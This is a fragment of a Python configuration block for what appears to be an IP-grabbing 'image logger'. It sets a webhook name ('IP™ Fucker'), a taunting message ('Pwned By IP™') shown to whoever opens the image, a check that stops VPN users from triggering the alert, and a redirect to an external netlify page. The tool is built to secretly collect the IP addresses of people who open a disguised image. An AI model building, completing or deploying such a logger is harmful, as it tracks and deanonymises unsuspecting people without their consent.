...
config = {
    ...
    # CUSTOMIZATION #
    "username": "IP™ Fucker", # Set this to the name you want the webhook to have
    ...
    "message": { # Show a custom message when the user opens the image
        ...
        "message": "Pwned By IP™", # Message to show
        "richMessage": False, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 3, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
    ...
    "redirect": {
        ...
        "page": "https://same-k28yfg1poye-latest.netlify.app/" # Link to the webpage to redirect to 
    },
